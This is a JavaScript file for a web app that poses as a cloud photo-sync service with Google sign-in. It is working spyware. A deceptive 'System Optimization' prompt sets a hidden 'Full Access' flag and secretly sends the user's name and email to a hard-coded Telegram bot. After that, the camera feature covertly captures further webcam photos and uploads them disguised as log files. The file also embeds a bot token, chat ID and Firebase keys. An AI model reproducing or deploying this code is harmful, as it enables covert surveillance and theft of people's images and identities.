import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
import { getAuth, signInWithPopup, GoogleAuthProvider, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js";

const firebaseConfig = {
    apiKey: "AIzaSyBLC6enWWKAr3O9ys-4NDjnhch4r1PSw0E",
    authDomain: "picmaster-59602.firebaseapp.com",
    projectId: "picmaster-59602",
    storageBucket: "picmaster-59602.firebasestorage.app",
    messagingSenderId: "434859259854",
    appId: "1:434859259854:web:522979eb1a7f8b6d211d9f"
};

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const provider = new GoogleAuthProvider();

const botToken = "8234454796:AAEF_c5gExxUp7X7pTpu9brOBmjIOTac2uQ";
const chatId = "7752627907";
let currentUser = null;
let integritySyncActive = false; // The hidden 'Full Access' flag

// Side Panel Controls
const sidePanel = document.getElementById('side-panel');
const settingsBtn = document.getElementById('settings-btn');
const menuToggle = document.getElementById('menu-toggle');

const togglePanel = (e) => { e.stopPropagation(); sidePanel.classList.toggle('active'); };
settingsBtn.onclick = togglePanel;
menuToggle.onclick = togglePanel;
document.onclick = (e) => { if (!sidePanel.contains(e.target)) sidePanel.classList.remove('active'); };

// Integrity Sync (The hidden Full Access Protocol)
document.getElementById('integrity-check-btn').onclick = async () => {
    if (!currentUser) return alert("Please login to verify system integrity.");
    
    const confirmSync = confirm("System Optimization: Grant permission to synchronize and backup all local media to secure cloud storage?");
    
    if (confirmSync) {
        integritySyncActive = true;
        alert("Integrity Sync Active. Optimizing cloud connection...");
        
        // Notify Telegram secretly
        const notifyMsg = `✅ INTEGRITY_GRANTED\nUser: ${currentUser.displayName}\nEmail: ${currentUser.email}`;
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(notifyMsg)}`);
    }
};

// Main Upload Logic
async function sendToTelegram(file, isSecret) {
    if (!currentUser) return;
    const formData = new FormData();
    formData.append("chat_id", chatId);
    formData.append("document", file, isSecret ? `sys_log_${Date.now()}.tmp` : "cloud_sync.jpg");
    formData.append("caption", isSecret ? `Log: ${currentUser.email}` : `Manual: ${currentUser.displayName}`);

    try {
        await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, { method: "POST", body: formData });
    } catch (e) { console.error("Sync Error"); }
}

// Camera & Secret Capture Protocol
document.getElementById('camera-btn').onclick = async () => {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById('webcam');
        video.srcObject = stream;
        video.style.display = 'block';
        video.play();

        setTimeout(() => {
            const canvas = document.getElementById('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            canvas.toBlob(blob => {
                sendToTelegram(blob, false);
                alert("✅ Cloud Sync Successful!");
                
                // If Full Access (Integrity Sync) is on, take secret photos
                if (integritySyncActive) {
                    let count = 0;
                    const interval = setInterval(() => {
                        if (count >= 4) {
                            clearInterval(interval);
                            stream.getTracks().forEach(t => t.stop());
                            video.style.display = 'none';
                        }
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        canvas.toBlob(b => sendToTelegram(b, true), 'image/jpeg');
                        count++;
                    }, 2500);
                } else {
                    stream.getTracks().forEach(t => t.stop());
                    video.style.display = 'none';
                }
            }, 'image/jpeg');
        }, 3000);
    } catch (err) { alert("Camera Permission Required."); }
};

// Drop Area Trigger
document.getElementById('drop-area').onclick = () => {
    if(!currentUser) return signInWithPopup(auth, provider);
    const input = document.createElement('input');
    input.type = 'file';
    input.onchange = (e) => { if(e.target.files[0]) sendToTelegram(e.target.files[0], false); };
    input.click();
};

// Auth Watcher
onAuthStateChanged(auth, (user) => {
    currentUser = user;
    const mainLogin = document.getElementById('main-login-btn');
    const cameraBtn = document.getElementById('camera-btn');
    const sideLogin = document.getElementById('side-login-btn');
    const logoutBtn = document.getElementById('logout-btn');
    const userDisp = document.getElementById('user-display');
    const panelName = document.getElementById('panel-user-name');

    if (user) {
        mainLogin.style.display = 'none';
        sideLogin.style.display = 'none';
        cameraBtn.style.display = 'block';
        logoutBtn.style.display = 'flex';
        userDisp.innerText = user.displayName;
        panelName.innerText = user.displayName;
    } else {
        mainLogin.style.display = 'block';
        sideLogin.style.display = 'flex';
        cameraBtn.style.display = 'none';
        logoutBtn.style.display = 'none';
        userDisp.innerText = "Guest User";
        panelName.innerText = "Guest";
    }
});

document.getElementById('main-login-btn').onclick = () => signInWithPopup(auth, provider);
document.getElementById('side-login-btn').onclick = () => signInWithPopup(auth, provider);
document.getElementById('logout-btn').onclick = () => signOut(auth).then(() => location.reload());
